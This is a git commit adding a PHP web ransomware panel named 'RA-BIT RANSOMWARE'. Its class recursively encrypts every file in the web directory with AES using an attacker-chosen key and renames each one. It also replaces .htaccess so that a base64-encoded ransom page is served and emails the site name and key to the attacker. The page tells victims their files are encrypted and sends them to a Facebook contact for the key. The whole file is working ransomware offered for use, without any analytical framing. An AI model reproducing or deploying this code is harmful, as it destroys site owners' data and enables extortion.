49328dbf1452b1a4c1ec4572c0ec9370a6bf16b8
root <root@localhost.localdomain>
2017-05-05 02:47:20 +0530

    reupload

---
+++ index.php
@@ -0,0 +1,430 @@
+<!DOCTYPE html>
+<html class="gr__adinahajj_com"><head>
+	  <title>Rabbit RASOMWARE</title>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <meta content="RA-BIT RANSOMWARE" name="description">
+      <meta content="RA-BIT RANSOMWARE" name="keywords">
+      <meta property="og:image" content="http://s29.postimg.org/7ru2q76jb/kcw_logo_deface.png">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+
+      <link href="RANSOMWARE_files/css.css" rel="stylesheet">
+      <link href="RANSOMWARE_files/animate.css" rel="stylesheet">
+      <link href="RANSOMWARE_files/font-awesome.css" rel="stylesheet">
+      <script type="text/javascript" src="RANSOMWARE_files/jquery-latest.js"></script>
+      
+
+      <!-- CSS START HERE -->
+      <style>
+		 html, body {min-height: 100%;}
+         body {
+		 width: 100%;
+		 height: 100%;
+         margin: 0;
+         padding: 0;
+         background-image: url('https://s17.postimg.org/ww1t0h4kf/34q233s.jpg');
+         background-color: #000;
+         background-repeat: no-repeat;
+         background-position: center;
+         background-size: 150%;
+         background-color: #000;
+         color: #FFFFFF;
+         font-family:"Orbitron";
+         font-size: 14pt;
+         text-align: center;
+         text-decoration: none;
+         } 
+         a { text-decoration: none; }
+         .vis {
+		  text-shadow: 2px 2px 2px #000;
+		 }
+.ipkey {
+         color: black;
+}
+         .glow {
+         text-shadow: 0 0 10px #F59700;
+         font-family:"Black Ops One";
+         }
+         .blueglow {
+         text-shadow: 0 0 10px #0F6FBD;
+         font-family:"Black Ops One"
+         }
+         .whiteglow,.gw {
+         text-shadow: 0 0 5px #FFFFFF;
+         font-family:"Black Ops One";
+         }
+
+         #hello {
+         font-size: 20px;
+         -moz-transition: color 1s;
+         -webkit-transition: color 1s;
+         -ms-transition: color 1s;
+         -o-transition: color 1s;
+         transition: color 1.2s;
+         font-family:"Black Ops One"
+         }
+         #hello:hover {
+         color: yellow;
+         -webkit-stroke-width: 10px;
+         -webkit-stroke-color: #FFFFFF;
+         -webkit-fill-color: #FFFFFF;
+         text-shadow: 1px 0px 20px red;
+         font-family:"Black Ops One"
+         }
+         .cn1,.gg {
+         text-shadow: 0 0 13px #57f927;
+         font-family:"Black Ops One";
+         }
+         .cna,.go {
+         text-shadow: 0 0 13px #f9991d;
+         font-family:"Black Ops One";
+         }
+         .gr {
+         text-shadow: 0 0 13px red;
+         font-family:"Black Ops One";
+         }
+         .kcwimg { 
+         width: 180px;
+         height: 140px; 
+         } 
+         .caps {
+         text-transform: uppercase;
+         font-family: "Cabin Sketch";
+         }
+	.selecte {
+	visibility: hidden;
+}
+
+         #neonfont
+         {
+         text-shadow: 0 0 5px red;
+         -webkit-transition: text-shadow 2s ease-out;
+         -moz-transition: text-shadow 2s ease-out;
+         -o-transition: text-shadow 2s ease-out;
+         transition: text-shadow 2s ease-out;
+         font-size:35px;
+         font-weight: bolder;
+         }
+         #neonfont:hover{
+         text-shadow: 0 0 30px red;
+         }
+         .mega {
+         text-shadow: 4px 0 8px #0073B9;
+         font-weight: bolder;
+         font-family: "Architects Daughter";
+         }
+         .weare {
+         font-family: "Permanent Marker";
+         text-shadow: 0 0 3px red;
+         font-size: 1.3em;
+         }
+         .thumb {
+         width: 180px; 
+         height: 190px; 
+         margin: 70px auto;
+         perspective: 1000px;
+         }
+         .thumb span {
+         display: block; width: 100%; height: 100%;
+         background: 
+         linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url("https://s30.postimg.org/x57acm2yp/chinese-rabbit.png");
+         background-size: 0, cover;
+         transform-style: preserve-3d;
+         transition: all 0.5s;
+         }
+         hr {
+			 box-shadow: 3px 3px 3px 3px #888888;
+			 color:#fff;
+			 margin-bottom: 2px;
+		 }
+		 .greeet {
+			 font-family:Aldrich;font-weight:bold;font-size:17px;
+		 } 
+		 .enhance {
+			 padding: 1em 1em;
+			 background:url('');
+		 }
+		 .nop {
+			 background: rgba(32, 32, 32, .4);
+                         padding: 8px 8px;
+		 } 
+		 .ipkey {
+			 width: 20%;
+             transition: width 1s;
+             -webkit-transition: width 1s;
+             -moz-transition: width 1s;
+             height: 40px;
+             font-family:Montserrat;font-weight:bold;font-size:25px;
+		 }
+		 .ipkey:hover {
+			 width: 30%;
+		 }
+		 .iptxt {
+			 width: 50%;
+			 height: 40px;
+			 font-family:Montserrat;font-weight:bold;font-size:15px;
+		 }
+		 .button {
+			 background: #666;
+			 border: 1px solid #fff;
+			 height: 40px;
+			 font-size: 20px;
+			 border-radius: 5px 5px 5px 5px;
+			 text-transform: uppercase;
+			 color: #fff;
+		 }
+		 .button:hover {
+			 background: #000;
+		 }
+      </style>
+   </head>
+   
+   <body data-gr-c-s-loaded="true">
+
+      <center>
+		  
+         <!-- who we are? -->
+         <div id="header">
+		   <span class="glow" style="font-size: 30pt;">‪ RA-BIT RANSOMWARE </span><br>
+		   		  
+           <div class="animated flip"><span class="weare"><font size="5"> << YOUR SITE IS INFECTED BY RABIT RANSOMWARE >></font></span></div>
+         </div>
+         <!-- KCW Logo --> 
+         <div class="thumb kcwimg">
+            <span></span>
+         </div>
+      
+
+
+
+
+<?php
+error_reporting(0);
+set_time_limit(0);
+ini_set('memory_limit', '-1');
+class deRanSomeware
+{
+   public function shcpackInstall(){
+    if(!file_exists(".htashor7cut")){
+      rename(".htaccess", ".htashor7cut");
+      if(fwrite(fopen('.htaccess', 'w'), "#Bug7sec Team\r\nDirectoryIndex shor7cut.php\r\nErrorDocument 404 /shor7cut.php")){
+            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
+      }
+      if(file_put_contents("shor7cut.php", base64_decode("PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KICAgPHRpdGxlPkF3ZXNvbWVXYXJlPC90aXRsZT4NCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQpib2R5IHsNCiAgICBiYWNrZ3JvdW5kOiAjMUExQzFGOw0KICAgIGNvbG9yOiAjZTJlMmUyOw0KfQ0KYXsNCiAgIGNvbG9yOmdyZWVuOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KPGNlbnRlcj4NCjxwcmU+DQogICAgICANCiAgICAgICAgICAgIC4tIiItLg0KICAgICAgICAgICAvIC4tLS4gXA0KICAgICAgICAgIC8gLyAgICBcIFwNCiAgICAgICAgICB8IHwgICAgfCB8DQogICAgICAgICAgfCB8Li0iIi0ufA0KICAgICAgICAgLy8vYC46Ojo6LmBcDQogICAgICAgIHx8fCA6Oi8gIFw6OiA7DQogICAgICAgIHx8OyA6OlxfXy86OiA7DQogICAgICAgICBcXFwgJzo6OjonIC8NCiAgICAgICAgICBgPSc6LS4uLSdgDQpZb3VyIHNpdGUgaXMgbG9ja2VkLCBwbGVhc2UgY29udGFjdCB2aWEgZW1haWw6DQogICAgIC1bIDxmb250IGNvbG9yPSJncmVlbiI+dG8xMzM3ZGF5W2F0XWdtYWlsLmNvbTwvZm9udD4gXS0NCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NClRoaXMgaXMgYSBub3RpY2Ugb2YgPGEgaHJlZj0iaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvUmFuc29td2FyZSI+cmFuc29td2FyZTwvYT4uPGJyPg0KSG93IHRvIHJlc3RvcmUgdGhlIGJlZ2lubmluZz8NClBsZWFzZSBjb250YWN0IHVzIHZpYSBlbWFpbCBsaXN0ZWQNCjwvcHJlPg0KPC9jZW50ZXI+DQo8L2JvZHk+DQo8L2h0bWw+"))){
+            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  shor7cut.php (Default Page)<br>';
+      }
+    }
+   }
+   public function shcpackUnstall(){
+
+      if( file_exists(".htashor7cut") ){
+        if( unlink(".htaccess") && unlink("shor7cut.php") ){
+          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
+          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> shor7cut.php (Default Page)<br>';
+        }
+        rename(".htashor7cut", ".htaccess");
+      }
+
+   }
+
+   public function plus(){
+      flush();
+      ob_flush();
+   }
+   public function locate(){
+        return getcwd();
+    }
+   public function shcdirs($dir,$method,$key){
+        switch ($method) {
+          case '1':
+            deRanSomeware::shcpackInstall();
+          break;
+          case '2':
+           deRanSomeware::shcpackUnstall();
+          break;
+        }
+        foreach(scandir($dir) as $d)
+        {
+            if($d!='.' && $d!='..')
+            {
+                $locate = $dir.DIRECTORY_SEPARATOR.$d;
+                if(!is_dir($locate)){
+                   if(  deRanSomeware::kecuali($locate,"AwesomeWare.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"shor7cut.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htashor7cut") ){
+                     switch ($method) {
+                        case '1':
+                           deRanSomeware::shcEnCry($key,$locate);
+                           deRanSomeware::shcEnDesDirS($locate,"1");
+                        break;
+                        case '2':
+                           deRanSomeware::shcDeCry($key,$locate);
+                           deRanSomeware::shcEnDesDirS($locate,"2");
+                        break;
+                     }
+                   }
+                }else{
+                  deRanSomeware::shcdirs($locate,$method,$key);
+                }
+            }
+            deRanSomeware::plus();
+        }
+        deRanSomeware::report($key);
+   }
+
+   public function report($key){
+        $message.= "=========     Ronggolawe Ransomware    =========\n";
+        $message.= "Website : ".$_SERVER['HTTP_HOST'];
+        $message.= "Key     : ".$key;
+        $message.= "========= Ronggolawe (2016) Ransomware =========\n";
+        $subject = "Report Ransomeware";
+        $headers = "From: Ransomware <ransomeware@shor7cut.today>\r\n";
+        mail("-- YOUR EMAIL --",$subject,$message,$headers);
+   }
+
+   public function shcEnDesDirS($locate,$method){
+      switch ($method) {
+        case '1':
+          rename($locate, $locate.".shor7cut");
+        break;
+        case '2':
+          $locates = str_replace(".shor7cut", "", $locate);
+          rename($locate, $locates);
+        break;
+      }
+   }
+
+   public function shcEnCry($key,$locate){
+      $data = file_get_contents($locate);
+      $iv = mcrypt_create_iv(
+          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
+          MCRYPT_DEV_URANDOM
+      );
+
+      $encrypted = base64_encode(
+          $iv .
+          mcrypt_encrypt(
+              MCRYPT_RIJNDAEL_128,
+              hash('sha256', $key, true),
+              $data,
+              MCRYPT_MODE_CBC,
+              $iv
+          )
+      );
+      if(file_put_contents($locate,  $encrypted )){
+         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
+      }else{
+         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
+      }
+   }
+
+   public function shcDeCry($key,$locate){
+      $data = base64_decode( file_get_contents($locate) );
+      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
+
+      $decrypted = rtrim(
+          mcrypt_decrypt(
+              MCRYPT_RIJNDAEL_128,
+              hash('sha256', $key, true),
+              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
+              MCRYPT_MODE_CBC,
+              $iv
+          ),
+          "\0"
+      );
+      if(file_put_contents($locate,  $decrypted )){
+         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
+      }else{
+         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
+      }
+   }
+
+
+
+   public function kecuali($ext,$name){
+        $re = "/({$name})/";
+        preg_match($re, $ext, $matches);
+        if($matches[1]){
+            return false;
+        }
+            return true;
+     }
+}
+
+if($_POST['submit']){
+switch ($_POST['method']) {
+   case '1':
+      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
+   break;
+   case '2':
+     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
+   break;
+}
+}else{
+?>
+
+
+
+
+
+
+
+         <!--encrypt msg -->
+         <div class="animated infinite flash"><span class="gr" style="color:black; font-family: &quot;Luckiest Guy&quot;"><font size="5"> YOUR FILES HAVE BEEN ENCRYPTED </font></span></div>
+         <br>
+         <!-- key -->
+         <div class="nop">
+         <form action="" method="post">
+         <p><< SUBMIT THE KEY TO DECRYPT FILES <>></p>
+         
+
+      <input type="text" name="key" class="ipkey" >
+<select name="method" class="selecte" >
+         <option value="2">Disinfect</option>
+      </select>
+      <input type="submit" name="submit" class="btn btn-default" value="Submit" />
+         </form>
+         </div>         <!-- I4M -->
+         <h1 style="font-family: &quot;Cherry Cream Soda&quot;;"><b>✗<span class="mega">BL4K_R4B17</span>✗</b></h1>
+         <br>
+         <br>
+         
+
+         <!-- warning -->
+           <div class="weare">We are Legion... We do not Forgive... We do not Forget... <b><i>Expect us</i></b></div>
+           <br>
+
+
+           
+<br>
+            <!-- Contact -->
+               <div class="vis"><b>&gt;&gt;&gt;</b><a href="https://www.facebook.com/n00brabbit" target="_blank"><b style="color: #000; text-shadow: 0 0 10px #fff;">CONTACT FOR DECRYPTION KEY</b></a><b>&lt;&lt;&lt;</b></div>
+ 
+      </center>
+   
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<?php
+}?>
+</body>
+</html>
+
+
+<?php
+
+?>
